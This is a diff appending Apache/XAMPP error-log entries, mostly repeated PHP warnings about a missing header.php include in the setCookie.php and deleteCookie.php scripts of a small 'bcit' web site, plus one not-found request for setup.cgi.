@@ -1681,3 +1681,891 @@ AH00112: Warning: DocumentRoot [C:/xampp/htdocs/wiki/] does not exist
 AH00112: Warning: DocumentRoot [C:/xampp/htdocs/wp] does not exist
 [Mon Feb 07 17:08:30.826355 2022] [ssl:warn] [pid 2356:tid 268] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
 [Mon Feb 07 17:08:30.841970 2022] [mpm_winnt:notice] [pid 2356:tid 268] AH00354: Child: Starting 150 worker threads.
+[Mon Feb 07 19:26:55.653735 2022] [cgi:error] [pid 2356:tid 1532] [client 180.116.27.209:45969] AH02811: script not found or unable to stat: C:/xampp/htdocs/setup.cgi
+[Mon Feb 07 20:12:48.490719 2022] [php7:notice] [pid 2356:tid 1524] [client 199.195.149.161:51099] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:12:48.490719 2022] [php7:notice] [pid 2356:tid 1524] [client 199.195.149.161:51099] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:12:48.490719 2022] [php7:notice] [pid 2356:tid 1524] [client 199.195.149.161:51099] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:12:48.490719 2022] [php7:notice] [pid 2356:tid 1524] [client 199.195.149.161:51099] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:12:48.490719 2022] [php7:notice] [pid 2356:tid 1524] [client 199.195.149.161:51099] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:12:48.490719 2022] [php7:notice] [pid 2356:tid 1524] [client 199.195.149.161:51099] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:19:45.171320 2022] [php7:notice] [pid 2356:tid 1492] [client 24.85.158.10:62236] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:19:45.171320 2022] [php7:notice] [pid 2356:tid 1492] [client 24.85.158.10:62236] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:19:45.171320 2022] [php7:notice] [pid 2356:tid 1492] [client 24.85.158.10:62236] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:19:45.171320 2022] [php7:notice] [pid 2356:tid 1492] [client 24.85.158.10:62236] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:19:45.171320 2022] [php7:notice] [pid 2356:tid 1492] [client 24.85.158.10:62236] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:19:45.171320 2022] [php7:notice] [pid 2356:tid 1492] [client 24.85.158.10:62236] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:19:55.435462 2022] [php7:notice] [pid 2356:tid 1476] [client 24.85.158.10:62237] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:19:55.435462 2022] [php7:notice] [pid 2356:tid 1476] [client 24.85.158.10:62237] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:19:55.435462 2022] [php7:notice] [pid 2356:tid 1476] [client 24.85.158.10:62237] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:19:55.435462 2022] [php7:notice] [pid 2356:tid 1476] [client 24.85.158.10:62237] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:19:55.435462 2022] [php7:notice] [pid 2356:tid 1476] [client 24.85.158.10:62237] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:19:55.435462 2022] [php7:notice] [pid 2356:tid 1476] [client 24.85.158.10:62237] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:24:20.510255 2022] [php7:notice] [pid 2356:tid 1552] [client 207.102.155.50:61083] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:24:20.510255 2022] [php7:notice] [pid 2356:tid 1552] [client 207.102.155.50:61083] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:24:20.510255 2022] [php7:notice] [pid 2356:tid 1552] [client 207.102.155.50:61083] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:24:20.510255 2022] [php7:notice] [pid 2356:tid 1552] [client 207.102.155.50:61083] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:24:20.510255 2022] [php7:notice] [pid 2356:tid 1552] [client 207.102.155.50:61083] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:24:20.510255 2022] [php7:notice] [pid 2356:tid 1552] [client 207.102.155.50:61083] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:25:38.799723 2022] [php7:notice] [pid 2356:tid 1536] [client 207.102.155.50:61094] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:25:38.799723 2022] [php7:notice] [pid 2356:tid 1536] [client 207.102.155.50:61094] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:25:38.799723 2022] [php7:notice] [pid 2356:tid 1536] [client 207.102.155.50:61094] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:25:38.799723 2022] [php7:notice] [pid 2356:tid 1536] [client 207.102.155.50:61094] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:25:38.799723 2022] [php7:notice] [pid 2356:tid 1536] [client 207.102.155.50:61094] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:25:38.799723 2022] [php7:notice] [pid 2356:tid 1536] [client 207.102.155.50:61094] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:26:11.935675 2022] [php7:notice] [pid 2356:tid 1476] [client 24.80.136.2:57253] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:26:11.935675 2022] [php7:notice] [pid 2356:tid 1476] [client 24.80.136.2:57253] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:26:11.935675 2022] [php7:notice] [pid 2356:tid 1476] [client 24.80.136.2:57253] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:26:11.935675 2022] [php7:notice] [pid 2356:tid 1476] [client 24.80.136.2:57253] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:26:11.935675 2022] [php7:notice] [pid 2356:tid 1476] [client 24.80.136.2:57253] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:26:11.935675 2022] [php7:notice] [pid 2356:tid 1476] [client 24.80.136.2:57253] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:26:44.766302 2022] [php7:notice] [pid 2356:tid 1488] [client 50.92.115.45:64432] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:26:44.766302 2022] [php7:notice] [pid 2356:tid 1488] [client 50.92.115.45:64432] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:26:44.766302 2022] [php7:notice] [pid 2356:tid 1488] [client 50.92.115.45:64432] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:26:44.766302 2022] [php7:notice] [pid 2356:tid 1488] [client 50.92.115.45:64432] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:26:44.766302 2022] [php7:notice] [pid 2356:tid 1488] [client 50.92.115.45:64432] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:26:44.766302 2022] [php7:notice] [pid 2356:tid 1488] [client 50.92.115.45:64432] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:27:13.895723 2022] [php7:notice] [pid 2356:tid 1496] [client 70.79.164.74:50677] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:27:13.895723 2022] [php7:notice] [pid 2356:tid 1496] [client 70.79.164.74:50677] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:27:13.895723 2022] [php7:notice] [pid 2356:tid 1496] [client 70.79.164.74:50677] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:27:13.895723 2022] [php7:notice] [pid 2356:tid 1496] [client 70.79.164.74:50677] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:27:13.895723 2022] [php7:notice] [pid 2356:tid 1496] [client 70.79.164.74:50677] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:27:13.895723 2022] [php7:notice] [pid 2356:tid 1496] [client 70.79.164.74:50677] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:27:19.035635 2022] [php7:notice] [pid 2356:tid 1536] [client 24.80.136.2:57305] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:27:19.035635 2022] [php7:notice] [pid 2356:tid 1536] [client 24.80.136.2:57305] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:27:19.035635 2022] [php7:notice] [pid 2356:tid 1536] [client 24.80.136.2:57305] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:27:19.035635 2022] [php7:notice] [pid 2356:tid 1536] [client 24.80.136.2:57305] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:27:19.035635 2022] [php7:notice] [pid 2356:tid 1536] [client 24.80.136.2:57305] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:27:19.035635 2022] [php7:notice] [pid 2356:tid 1536] [client 24.80.136.2:57305] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:27:25.566427 2022] [php7:notice] [pid 2356:tid 1532] [client 24.80.136.2:57309] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:27:25.566427 2022] [php7:notice] [pid 2356:tid 1532] [client 24.80.136.2:57309] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:27:25.566427 2022] [php7:notice] [pid 2356:tid 1532] [client 24.80.136.2:57309] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:27:25.566427 2022] [php7:notice] [pid 2356:tid 1532] [client 24.80.136.2:57309] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:27:25.566427 2022] [php7:notice] [pid 2356:tid 1532] [client 24.80.136.2:57309] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:27:25.566427 2022] [php7:notice] [pid 2356:tid 1532] [client 24.80.136.2:57309] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:27:43.750355 2022] [php7:notice] [pid 2356:tid 1488] [client 24.80.136.2:57312] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:27:43.750355 2022] [php7:notice] [pid 2356:tid 1488] [client 24.80.136.2:57312] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:27:43.750355 2022] [php7:notice] [pid 2356:tid 1488] [client 24.80.136.2:57312] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:27:43.750355 2022] [php7:notice] [pid 2356:tid 1488] [client 24.80.136.2:57312] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:27:43.750355 2022] [php7:notice] [pid 2356:tid 1488] [client 24.80.136.2:57312] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:27:43.750355 2022] [php7:notice] [pid 2356:tid 1488] [client 24.80.136.2:57312] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:27:51.076633 2022] [php7:notice] [pid 2356:tid 1492] [client 24.80.136.2:57314] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:27:51.076633 2022] [php7:notice] [pid 2356:tid 1492] [client 24.80.136.2:57314] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:27:51.076633 2022] [php7:notice] [pid 2356:tid 1492] [client 24.80.136.2:57314] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:27:51.076633 2022] [php7:notice] [pid 2356:tid 1492] [client 24.80.136.2:57314] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:27:51.076633 2022] [php7:notice] [pid 2356:tid 1492] [client 24.80.136.2:57314] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:27:51.076633 2022] [php7:notice] [pid 2356:tid 1492] [client 24.80.136.2:57314] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:28:37.229450 2022] [php7:notice] [pid 2356:tid 1548] [client 50.92.115.45:64500] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:28:37.229450 2022] [php7:notice] [pid 2356:tid 1548] [client 50.92.115.45:64500] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:28:37.229450 2022] [php7:notice] [pid 2356:tid 1548] [client 50.92.115.45:64500] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:28:37.229450 2022] [php7:notice] [pid 2356:tid 1548] [client 50.92.115.45:64500] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:28:37.229450 2022] [php7:notice] [pid 2356:tid 1548] [client 50.92.115.45:64500] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:28:37.229450 2022] [php7:notice] [pid 2356:tid 1548] [client 50.92.115.45:64500] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:28:42.369362 2022] [php7:notice] [pid 2356:tid 1548] [client 50.92.115.45:64501] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:28:42.369362 2022] [php7:notice] [pid 2356:tid 1548] [client 50.92.115.45:64501] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:28:42.369362 2022] [php7:notice] [pid 2356:tid 1548] [client 50.92.115.45:64501] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:28:42.369362 2022] [php7:notice] [pid 2356:tid 1548] [client 50.92.115.45:64501] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:28:42.369362 2022] [php7:notice] [pid 2356:tid 1548] [client 50.92.115.45:64501] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:28:42.369362 2022] [php7:notice] [pid 2356:tid 1548] [client 50.92.115.45:64501] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:28:46.337031 2022] [php7:notice] [pid 2356:tid 1548] [client 50.92.115.45:64501] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:28:46.337031 2022] [php7:notice] [pid 2356:tid 1548] [client 50.92.115.45:64501] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:28:46.337031 2022] [php7:notice] [pid 2356:tid 1548] [client 50.92.115.45:64501] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:28:46.337031 2022] [php7:notice] [pid 2356:tid 1548] [client 50.92.115.45:64501] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:28:46.337031 2022] [php7:notice] [pid 2356:tid 1548] [client 50.92.115.45:64501] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:28:46.337031 2022] [php7:notice] [pid 2356:tid 1548] [client 50.92.115.45:64501] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:29:44.712999 2022] [php7:notice] [pid 2356:tid 1548] [client 50.92.115.45:64511] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:29:44.712999 2022] [php7:notice] [pid 2356:tid 1548] [client 50.92.115.45:64511] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:29:44.712999 2022] [php7:notice] [pid 2356:tid 1548] [client 50.92.115.45:64511] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:29:44.712999 2022] [php7:notice] [pid 2356:tid 1548] [client 50.92.115.45:64511] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:29:44.712999 2022] [php7:notice] [pid 2356:tid 1548] [client 50.92.115.45:64511] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:29:44.712999 2022] [php7:notice] [pid 2356:tid 1548] [client 50.92.115.45:64511] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:29:44.712999 2022] [php7:notice] [pid 2356:tid 1548] [client 50.92.115.45:64511] PHP Notice:  Undefined index: webDelete in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 9, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:29:44.712999 2022] [php7:notice] [pid 2356:tid 1548] [client 50.92.115.45:64511] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:29:44.712999 2022] [php7:notice] [pid 2356:tid 1548] [client 50.92.115.45:64511] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:29:44.712999 2022] [php7:notice] [pid 2356:tid 1548] [client 50.92.115.45:64511] PHP Warning:  Invalid argument supplied for foreach() in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 9, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:29:44.712999 2022] [php7:notice] [pid 2356:tid 1548] [client 50.92.115.45:64511] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:29:44.712999 2022] [php7:notice] [pid 2356:tid 1548] [client 50.92.115.45:64511] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:29:44.712999 2022] [php7:notice] [pid 2356:tid 1548] [client 50.92.115.45:64511] PHP Warning:  Cannot modify header information - headers already sent by (output started at C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:9) in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 18, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:29:44.712999 2022] [php7:notice] [pid 2356:tid 1548] [client 50.92.115.45:64511] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:29:44.712999 2022] [php7:notice] [pid 2356:tid 1548] [client 50.92.115.45:64511] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:29:44.712999 2022] [php7:notice] [pid 2356:tid 1548] [client 50.92.115.45:64511] PHP   2. header() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:18, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:29:55.522822 2022] [php7:notice] [pid 2356:tid 1496] [client 50.92.115.45:64512] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:29:55.522822 2022] [php7:notice] [pid 2356:tid 1496] [client 50.92.115.45:64512] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:29:55.522822 2022] [php7:notice] [pid 2356:tid 1496] [client 50.92.115.45:64512] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:29:55.522822 2022] [php7:notice] [pid 2356:tid 1496] [client 50.92.115.45:64512] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:29:55.522822 2022] [php7:notice] [pid 2356:tid 1496] [client 50.92.115.45:64512] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:29:55.522822 2022] [php7:notice] [pid 2356:tid 1496] [client 50.92.115.45:64512] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:30:01.630982 2022] [php7:notice] [pid 2356:tid 1496] [client 50.92.115.45:64514] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:30:01.630982 2022] [php7:notice] [pid 2356:tid 1496] [client 50.92.115.45:64514] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:30:01.630982 2022] [php7:notice] [pid 2356:tid 1496] [client 50.92.115.45:64514] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:30:01.630982 2022] [php7:notice] [pid 2356:tid 1496] [client 50.92.115.45:64514] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:30:01.630982 2022] [php7:notice] [pid 2356:tid 1496] [client 50.92.115.45:64514] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
